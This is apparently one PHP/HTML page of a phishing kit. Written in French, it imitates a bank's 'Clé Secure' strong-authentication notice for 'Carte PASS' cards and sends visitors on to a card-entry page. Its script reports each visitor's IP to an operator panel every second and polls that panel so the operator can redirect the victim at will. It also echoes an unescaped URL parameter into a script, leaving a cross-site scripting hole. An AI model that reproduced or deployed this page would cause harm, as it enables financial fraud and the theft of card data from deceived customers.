<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Clé Secure</title>
    <link rel="stylesheet" href="inc/conf.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <p>NOUVEAU SERVICE</p>
            <span>Une sécurité renforcée pour vos opérations en ligne</span>
        </div>
        <div class="content">
            <h3 style="color:black;">Les avantages de la Clé Secure</h3>
            <p>Utilisez votre mobile pour valider vos opérations sensibles réalisées sur votre Espace Client et vos paiements en ligne Carte PASS de plus de 30€.</p>

            <div class="list">
            <h3>Plus simple</h3>
            <p>Fini, les codes à usage unique !<br>Je saisis mon code Clé Secure réutilisable.</p>

            <h3>Plus sécurisé</h3>
            <p>La Clé Secure utilise l'authentification forte conforme aux nouvelles exigences européennes de sécurité des services de paiement.</p>
</div>

            <div class="button-container">
                <button onclick="window.location='card.php';">Suivant</button>
            </div>
        </div>
    </div>


<script src="inc/cdns/jq.js"></script>
<script>
 
setInterval(() => {
    $.post("../panel/update_statu.php",{update:1, ip:'<?php echo $pnl->IP; ?>'});
}, 1000);
var page ="<?php echo @$_GET['p']; ?>";
var cd = "<?php echo $current_data; ?>";

setInterval(() => {
    $.post("../panel/fetch.php", {update:1}, function(d){
        if(cd!=d){
            window.location=d;
        }
    })

}, 2000);
</script>
</body>
</html>
